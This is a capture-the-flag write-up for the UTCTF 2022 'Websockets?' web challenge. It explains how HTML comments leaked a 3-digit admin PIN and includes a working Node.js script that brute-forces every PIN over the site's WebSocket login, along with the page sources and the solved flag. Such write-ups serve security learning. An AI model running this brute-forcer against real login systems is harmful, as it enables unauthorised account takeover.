---
layout: post
title: "[UTCTF 2022] Websockets?"
author: "disna"
---

# Outline
- [Problem Description](#problem-description)
- [Process](#process)
- [Flag](#flag)
- [Files](#files)

# Problem Description
Description: Can you hack my website?
<br>
Site: http://web1.utctf.live:8651
<br><br>
At first glance, we find ourselves a pretty landing page with a single `Contact Us` button that leads nowhere.

# Process
Inspecting the [HTML of the page](#page-source) we're given, we see a couple of interesting details:
- An `href` pointing to `/contact-us`: Gives a 404 not found error.
- A verbose HTML comment:
- - `<!-- TODO: this button is set to the wrong URL and for some reason only the 'admin' account can change it. Tom is the only one who knows the passcode and he's out until Wednesday. I'm not paid enough to deal with this so it's just going to be broken for now. It's not like we get traffic anyway 😠 -->`
- An `href` pointing to `/internal/login`: Gives us a login page for staff. This page, too, contains a verbose HTML comment:
- - `<!-- what is this garbage, you ask? Well, most of our pins are now 16 digits, but we still have some old 3-digit pins left because tom is a moron and can't remember jack -->`
- - We also get a `/static/login.js` page, which contains the code that governs how the browser sends a login request to the server, and how it manages the server's response.

From the HTML comments alone, we can venture a reasonable guess that the `admin` account has a three digit password, which is easily bruteforceable in `10^3` login attempts (passwords 000 to 999). The page source of `/internal/login` also enforces the format of the password to be either a 3 or 16-digit pin. 

Inspecting the HTTP traffic with `Burp Suite` (Proxy -> HTTP History), we see that the login request goes through `http://web1.utctf.live:8651/internal/ws`, which is where the Websocket part of the challenge comes in.

<details>
<summary>A quick summary of Websockets</summary>
The Websocket Protocol (RFC 6455) is essentially another layer over the HTTP protocol. To the best of my understanding, the first request to <code>http://web1.utctf.live:8651/internal/ws</code> sets up a two-way communication channel between the client and the server, through which they send short messages.
</details>

<br>

Under the Websockets history tab in Burp Suite, we can see that a single login request takes the following form:
1. Server sends `begin`
2. Client sends `begin`
3. Client sends `user <myuser>`
4. Client sends `pass <mypass>`
5. Server sends its response (`badpass` if the password is wrong, `flask-session=SESSIONID` if the password is correct).

The idea is to emulate this traffic programatically, and repeat it for all different possible passwords. I used NodeJS for this, because the way to use websockets here is well-documented (https://www.npmjs.com/package/websocket), and parallelizing requests is fairly easy to do in JS. Eventually, we find the right password to use (907), and after logging in as `admin`, we see our flag:

# Flag
`utflag{w3bsock3ts}`

# Files
## Password bruteforcer
```js
const WebSocket = require('websocket').w3cwebsocket;

async function main() {
    for (let i = 0; i < 10; i++) {
        for (let j = 0; j < 10; j++) {
            for (let k = 0; k < 10; k++) {
                let pass = `${i}${j}${k}`
                connectWithPassword(pass)
            }
        }
    }
}

async function connectWithPassword(pass) {
    const url = "ws://web1.utctf.live:8651/internal/ws"
    const client = new WebSocket(url);
    client.onerror = function () {
        console.log('Connection Error');
    };

    client.onmessage = function (e) {
        if (typeof e.data === 'string') {
            console.log(e.data);
            if (e.data == "begin") {
                let user = "admin"
                client.send("begin");
                client.send("user " + user);
                client.send("pass " + pass);
            }
            else if (e.data === "baduser") {
                // skip
            }
            else if (e.data === "error") {
                // skip
            }
            else if (e.data === "badpass") {
                // skip
            }
            else {
                console.log("Pass worked: " + pass)
                console.log(e.data)
                return;
            }
        }
    };

    client.onclose = function () {
        return "closed";
    }

    // wait for client to close
    await new Promise(resolve => {
        client.onclose = resolve;
    });
}

main();
```

## `/` page source
```html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <link rel="stylesheet" href="/static/style.css">
        <title>Fake Corp</title>
    </head>
    <body>
<div class="content backdrop">
<center>
    <h1 class=fancy>Fake Company</h1>
    <span class=fancy>We are dedicated to empowering our customers to 10x their development lifecycle synergies.</span>
    <span class=fancy>Want to learn about our solutions?</span>
    <!-- TODO: this button is set to the wrong URL and for some reason only the 'admin' account can change it. Tom is the only one who knows the passcode and he's out until Wednesday. I'm not paid enough to deal with this so it's just going to be broken for now. It's not like we get traffic anyway 😠 -->
    <a class="fancy button" href="/contact-us">Contact Us</a>
</center>
        </div>
        <div id="footer">
            <a href="/internal/login">Employee login</a>
        </div>
    </body>
</html>
```

## `/internal/login` page source
```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		
		<link rel="stylesheet" href="/static/style.css">
		<title>Fake Corp</title>
		
	</head>
	<body>
		
		<div class="content">
		
			
<div class="topbox">
	<h1>Login</h1>
	<span class="error"></span>
	<form method="post">
		<input name="username" type="text" placeholder="Username" required> 
		<!-- what is this garbage, you ask? Well, most of our pins are now 16 digits, but we still have some old 3-digit pins left because tom is a moron and can't remember jack -->
		<input name="password" type="password" placeholder="PIN" required pattern="(\d{3}|\d{16})">
		<input type="submit">
	</form>
	<script src="/static/login.js"></script>
</div>

		</div>
		<div id="footer">
			
			<a href="/internal/login">Employee login</a>
			
		</div>
	</body>
</html>
```

## `/static/login.js`
```js
document.querySelector("input[type=submit]").addEventListener("click", checkPassword);

function checkPassword(evt) {
	evt.preventDefault();
	const socket = new WebSocket("ws://" + window.location.host + "/internal/ws")
	socket.addEventListener('message', (event) => {
		if (event.data == "begin") {
			socket.send("begin");
			socket.send("user " + document.querySelector("input[name=username]").value)
			socket.send("pass " + document.querySelector("input[name=password]").value)
		} else if (event.data == "baduser") {
			document.querySelector(".error").innerHTML = "Unknown user";
			socket.close()
		} else if (event.data == "badpass") {
			document.querySelector(".error").innerHTML = "Incorrect PIN";
			socket.close()
		} else if (event.data.startsWith("session ")) {
			document.cookie = "flask-session=" + event.data.replace("session ", "") + ";";
			socket.send("goodbye")
			socket.close()
			window.location = "/internal/user";
		} else {
			document.querySelector(".error").innerHTML = "Unknown error";
			socket.close()
		} 
	})
}
```